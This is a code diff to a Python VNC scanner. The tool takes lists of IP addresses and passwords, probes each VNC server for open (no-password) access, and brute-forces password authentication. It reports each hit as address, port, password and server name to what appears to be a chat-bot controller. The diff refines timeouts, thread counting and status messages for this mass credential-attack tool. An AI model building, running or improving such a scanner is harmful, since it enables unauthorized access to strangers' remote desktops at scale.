@@ -47,6 +47,7 @@ class VNCScanner:
         self.current_password = ""
         self.loop = None
         self.stopped = False
+        self.active_threads = 0
         
     def load_ips(self, content):
         ips = []
@@ -71,6 +72,7 @@ class VNCScanner:
         
     def vnc_handshake(self, sock):
         try:
+            sock.settimeout(self.brute_timeout)
             version = sock.recv(12)
             if not version.startswith(b'RFB '):
                 return None, None
@@ -88,6 +90,7 @@ class VNCScanner:
             
     def get_server_name(self, sock):
         try:
+            sock.settimeout(self.brute_timeout)
             sock.recv(2)
             sock.recv(2)
             sock.recv(16)
@@ -104,7 +107,7 @@ class VNCScanner:
     def check_vnc_auth(self, ip, port, password=""):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(self.brute_timeout)
+            sock.settimeout(self.scan_timeout if not password else self.brute_timeout)
             sock.connect((ip, port))
             version, sec_types = self.vnc_handshake(sock)
             if version is None:
@@ -112,6 +115,7 @@ class VNCScanner:
                 return False, None, None
             if sec_types and 1 in sec_types:
                 sock.sendall(b'\x01')
+                sock.settimeout(self.brute_timeout)
                 result = sock.recv(4)
                 if len(result) == 4:
                     auth_result = struct.unpack('!I', result)[0]
@@ -122,6 +126,7 @@ class VNCScanner:
                         return True, "null", server_name
             elif sec_types and 2 in sec_types and password:
                 sock.sendall(b'\x02')
+                sock.settimeout(self.brute_timeout)
                 challenge = sock.recv(16)
                 if len(challenge) != 16:
                     sock.close()
@@ -139,10 +144,13 @@ class VNCScanner:
                         return True, password, server_name
             sock.close()
             return False, None, None
-        except:
+        except Exception as e:
             return False, None, None
             
     def worker(self):
+        with self.lock:
+            self.active_threads += 1
+            
         while self.running:
             try:
                 item = self.queue.get(timeout=1)
@@ -152,7 +160,6 @@ class VNCScanner:
                 break
             
             ip, port = item
-            found = False
             
             if not self.running:
                 self.queue.task_done()
@@ -163,7 +170,6 @@ class VNCScanner:
                 result = f"{ip}:{port}-{password}-[{server_name}]"
                 with self.lock:
                     self.results.append(result)
-                    found = True
                 if self.loop:
                     asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
             else:
@@ -177,7 +183,6 @@ class VNCScanner:
                         result = f"{ip}:{port}-{password}-[{server_name}]"
                         with self.lock:
                             self.results.append(result)
-                            found = True
                         if self.loop:
                             asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
                         break
@@ -186,6 +191,9 @@ class VNCScanner:
                 self.checked_servers += 1
                 
             self.queue.task_done()
+            
+        with self.lock:
+            self.active_threads -= 1
     
     def stop(self):
         self.running = False
@@ -219,6 +227,7 @@ class VNCScanner:
                 total = self.total_servers
                 hits = len(self.results)
                 current_pwd = self.current_password
+                active = self.active_threads
             elapsed = time.time() - self.start_time
             percent = (current / total) * 100 if total > 0 else 0
             speed = current / elapsed if elapsed > 0 else 0
@@ -233,10 +242,10 @@ class VNCScanner:
                 f"<b>VNC SCANNER STATUS</b>\n\n"
                 f"<b>Progress:</b> {current}/{total} ({percent:.1f}%)\n\n"
                 f"<b>Hits Found:</b> {hits}\n\n"
-                f"<b>Speed:</b> {speed:.1f} servers/sec\n\n"
+                f"<b>Speed:</b> {speed:.2f} servers/sec\n\n"
                 f"<b>Elapsed:</b> {format_time(elapsed)}\n\n"
                 f"<b>Remaining:</b> {format_time(remaining)}\n\n"
-                f"<b>Threads:</b> {self.scan_threads}\n\n"
+                f"<b>Threads:</b> {self.scan_threads} (Active: {active})\n\n"
                 f"<b>Timeout:</b> {self.scan_timeout}s\n\n"
                 f"{trying_text}"
             )
@@ -261,6 +270,8 @@ class VNCScanner:
         self.passwords = self.load_passwords(passwords_content)
         self.total_servers = len(ips)
         self.start_time = time.time()
+        
+        print(f"Starting scan with {len(ips)} servers and {len(self.passwords)} passwords")
         
         text = (
             f"<b>SCAN STARTED</b>\n\n"
@@ -315,13 +326,15 @@ class VNCScanner:
         
         elapsed = time.time() - self.start_time
         
+        print(f"Scan finished: {self.checked_servers} servers in {elapsed:.2f}s")
+        
         if self.stopped:
             text = (
                 f"<b>SCAN STOPPED</b>\n\n"
                 f"<b>Total Checked:</b> {self.checked_servers}/{self.total_servers}\n"
                 f"<b>Hits Found:</b> {len(self.results)}\n"
                 f"<b>Time Elapsed:</b> {format_time(elapsed)}\n"
-                f"<b>Speed:</b> {self.checked_servers/elapsed:.1f} servers/sec\n\n"
+                f"<b>Speed:</b> {self.checked_servers/elapsed:.2f} servers/sec\n\n"
                 f"Scan was stopped by user"
             )
         else:
@@ -330,7 +343,7 @@ class VNCScanner:
                 f"<b>Total Checked:</b> {self.checked_servers}\n"
                 f"<b>Hits Found:</b> {len(self.results)}\n"
                 f"<b>Time Elapsed:</b> {format_time(elapsed)}\n"
-                f"<b>Speed:</b> {self.checked_servers/elapsed:.1f} servers/sec\n\n"
+                f"<b>Speed:</b> {self.checked_servers/elapsed:.2f} servers/sec\n\n"
                 f"Results saved to file"
             )
         
